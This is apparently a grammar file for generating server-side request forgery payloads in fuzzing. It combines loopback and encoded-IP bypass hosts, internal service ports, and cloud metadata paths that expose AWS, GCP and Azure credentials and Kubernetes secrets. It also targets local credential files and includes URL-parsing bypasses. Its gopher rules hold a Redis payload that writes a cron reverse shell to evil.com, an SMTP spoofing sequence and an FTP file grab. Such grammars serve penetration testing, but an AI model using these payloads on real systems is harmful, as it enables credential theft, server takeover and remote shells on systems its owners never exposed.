start : ssrfURL;

ssrfURL : httpURL | httpsURL | fileURL | gopherURL | dictURL | sftpURL | tftpURL | ldapURL | netdocURL | jarURL | urlParsingDiscrepancy | phpFilterVarBypass | dnsRebinding | redirectBypass;

httpURL : 'http://' host port path query;
httpsURL : 'https://' host port path query;
fileURL : 'file://' filePath | 'file:///' filePath;
gopherURL : 'gopher://' host port gopherSelector;
dictURL : 'dict://' host port dictPath;
sftpURL : 'sftp://' host port path;
tftpURL : 'tftp://' host port path;
ldapURL : 'ldap://' host port ldapQuery;
netdocURL : 'netdoc://' host port path;
jarURL : 'jar://' host path;
dnsRebinding : 'http://' rebindHost port path;
redirectBypass : 'http://' redirectHost port redirectPath;

host : standardHost | bypassHost | octalHost | hexHost | decimalHost | dnsRebindHost;
standardHost : 'localhost' | '127.0.0.1' | '192.168.0.1' | '10.0.0.1' | '172.16.0.1' | '8.8.8.8' | '1.1.1.1' | 'example.com' | 'localtest.me' | '169.254.169.254' | 'metadata.google.internal' | 'customer1.app.localhost.my.company.127.0.0.1.nip.io' | 'mail.ebc.apple.com' | 'bugbounty.dod.network' | 'localh.st' | 'nip.io' | 'xip.io' | 'sslip.io' | '127.0.0.1.nip.io' | 'webhook.site' | 'interact.sh' | 'burpcollaborator.net' | 'oastify.com' | 'requestrepo.com' | 'company.127.0.0.1.nip.io' | '127.127.127.127' | '127.0.1.3' | '127.0.0.0' | '0.0.0.0' | '0/' | '127.1' | '127.0.1' | 'metadata' | 'kubernetes.default' | 'kubernetes.default.svc' | 'kubernetes.default.svc.cluster.local';
bypassHost : '[::]' | '[0000::1]' | '[0:0:0:0:0:ffff:127.0.0.1]' | '[::ffff:127.0.0.1]' | '[::1]' | '[::ffff:7f00:1]';
octalHost : '0177.0.0.1' | 'o177.0.0.1' | '0o177.0.0.1' | 'q177.0.0.1' | '0177.0.0.0001';
hexHost : '0x7f.0x0.0x0.0x1' | '0x7f000001' | '0x7f.1';
decimalHost : '2130706433' | '3232235521' | '3232235777' | '2852039166' | '16843009';
dnsRebindHost : 'make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms' | '100.100.100.200' | '169.254.169.254' | 'make-127.0.0.1-rebind-169.254.169.254-rr.1u.ms';
rebindHost : 'attacker.com' | 'evil.com' | 'rebind.it' | 'rebind.network';
redirectHost : '127.0.0.1' | 'localhost' | 'example.com';

port : '' | ':80' | ':443' | ':22' | ':25' | ':3128' | ':6379' | ':27017' | ':3306' | ':1433' | ':445' | ':3389' | ':21' | ':23' | ':53' | ':161' | ':162' | ':389' | ':636' | ':8500' | ':9001' | ':8080' | ':8443' | ':5000' | ':5001' | ':8000' | ':8001' | ':8081' | ':9000' | ':9200' | ':9300' | ':11211' | ':27018' | ':27019' | ':28017' | ':50070' | ':50075' | ':6006' | ':2375' | ':2376' | ':4243' | ':10250' | ':10255' | ':10256' | ':9443' | ':6443' | ':2379' | ':2380' | ':9091' | ':9090';

path : '' | webPath | filePath | query | gopherSelector | awsPath | gcpPath | azurePath | k8sPath;

webPath : '/' | '/index.html' | '/index.php' | '/admin.php' | '/login.php' | '/wp-login.php' | '/wp-admin/' | '/api/v1/resource' | '/api/v2/resource' | '/api/resource?query=param' | '/api/resource#fragment' | '/static/css/style.css' | '/static/js/app.js' | '/assets/images/logo.png' | '/uploads/file.pdf' | '/.env' | '/.git/config' | '/config.json' | '/package.json' | '/composer.json' | '/.aws/credentials' | '/.ssh/id_rsa';
//### Cloud Provider Metadata Paths (2025 Updated) ###
awsPath : '/latest/meta-data/' | '/latest/user-data' | '/latest/meta-data/instance-id' | '/latest/meta-data/ami-id' | '/latest/meta-data/hostname' | '/latest/meta-data/public-ipv4' | '/latest/meta-data/local-ipv4' | '/latest/meta-data/iam/security-credentials/' | '/latest/meta-data/iam/security-credentials/admin' | '/latest/meta-data/iam/security-credentials/ecsInstanceRole' | '/latest/meta-data/public-keys/0/openssh-key' | '/latest/dynamic/instance-identity/document' | '/latest/api/token';

gcpPath : '/computeMetadata/v1/' | '/computeMetadata/v1/instance/' | '/computeMetadata/v1/instance/service-accounts/default/token' | '/computeMetadata/v1/instance/attributes/' | '/computeMetadata/v1/instance/attributes/kube-env' | '/computeMetadata/v1/project/' | '/computeMetadata/v1/project/attributes/ssh-keys' | '/computeMetadata/v1/instance/hostname' | '/computeMetadata/v1/instance/id' | '/computeMetadata/v1/instance/zone' | '/computeMetadata/v1beta1/instance/service-accounts/default/token';

azurePath : '/metadata/instance?api-version=2021-02-01' | '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | '/metadata/instance/compute?api-version=2021-02-01' | '/metadata/instance/network?api-version=2021-02-01' | '/metadata/instance/compute/azEnvironment?api-version=2021-02-01&format=text' | '/metadata/identity/oauth2/token?api-version=2021-12-01&resource=https://vault.azure.net';

k8sPath : '/api/v1/namespaces/default/pods' | '/api/v1/namespaces/kube-system/secrets' | '/api/v1/namespaces/default/secrets' | '/api/v1/namespaces' | '/api/v1/nodes' | '/version' | '/healthz' | '/metrics';

filePath : '' | '/etc/passwd' | '/proc/self/environ' | '/var/www/html/index.php' | '/wp-config.php' | '/etc/shadow' | '/root/.ssh/id_rsa' | '/root/.ssh/authorized_keys' | '/home/user/.aws/credentials' | '/home/user/.config/gcloud/credentials' | '/.git/config' | '/.git/HEAD' | '/etc/hosts' | '/etc/resolv.conf' | '/etc/hostname' | '/%65tc/%70asswd' | '/%70roc/%73elf/%65nviron' | '/etc/lsb-release' | '\/\/etc/passwd' | '/proc/self/cmdline' | '/proc/self/cwd/index.php' | '/proc/self/cwd/application.py' | '/proc/self/cwd/main.py' | '/proc/self/cwd/.env' | '/proc/self/exe' | '/proc/version' | '/proc/net/arp' | '/proc/net/tcp' | '/var/log/apache2/access.log' | '/var/log/nginx/access.log' | 'C:/Windows/System32/drivers/etc/hosts' | 'C:/inetpub/wwwroot/web.config';

query : '' | '?' queryParams | '#' fragment;
queryParams : keyValuePair | keyValuePair '&' queryParams;
keyValuePair : key '=' value;
fragment : 'section' | 'top' | 'content';
key : 'cmd' | 'query' | 'password' | 'user' | 'action' | 'url' | 'redirect' | 'api-version' | 'resource' | 'format' | 'alt' | 'recursive';
value : 'info' | 'SELECT * FROM users' | 'admin' | 'password123' | 'http://evil.com' | 'file:///etc/passwd' | '2021-02-01' | 'https://management.azure.com/' | 'json' | 'text' | 'true';

dictPath : '/info' | '/stat' | '/list';
ldapQuery : '/dc=example,dc=com' | '/cn=admin,dc=example,dc=com';
redirectPath : '/redirect?url=http://169.254.169.254/latest/meta-data/' | '/@169.254.169.254/latest/meta-data/' | '/ssrf.php?url=http://localhost/admin';

gopherSelector : smtpGopher | ftpGopher | redisGopher | memcachedGopher | otherGopher;
smtpGopher : '/_HELO localhost\r\nMAIL FROM:<hacker@site.com>\r\nRCPT TO:<victim@site.com>\r\nDATA\r\nFrom: [Hacker] <hacker@site.com>\r\nTo: <victim@site.com>\r\nDate: Tue, 15 Sep 2017 17:20:26 -0400\r\nSubject: AH AH AH\r\n\r\nYou didn\'t say the magic word !\r\n\r\n.\r\nQUIT\r\n';
ftpGopher : '/USER anonymous\r\nPASS anonymous@anonymous.com\r\nCWD /\r\nRETR passwd\r\nQUIT\r\n';
redisGopher : '/*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a\r\n\r\n*/1 * * * * bash -i >& /dev/tcp/evil.com/8080 0>&1\r\n\r\n%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a';
memcachedGopher : '/stats%0Aget%20mykey%0A';
otherGopher : '/1%09display%09selector' | '/_GET / HTTP/1.1%0AHost: localhost%0A%0A';

urlParsingDiscrepancy : 'http://127.1.1.1:80\@127.2.2.2:80/' | 'http://127.1.1.1:80\@@127.2.2.2:80/' | 'http://127.1.1.1:80:\@@127.2.2.2:80/' | 'http://127.1.1.1:80#\@127.2.2.2:80/' | 'http://foo@evil.com:80@google.com/' | 'http://google.com#@evil.com/' | 'http://evil.com%23@google.com/';

phpFilterVarBypass : 'http://test???test.com' | '0://evil.com:80;http://google.com:80/' | 'http://0177.0.0.1/' | 'http://2130706433/' | 'http://0x7f.0x0.0x0.0x1/';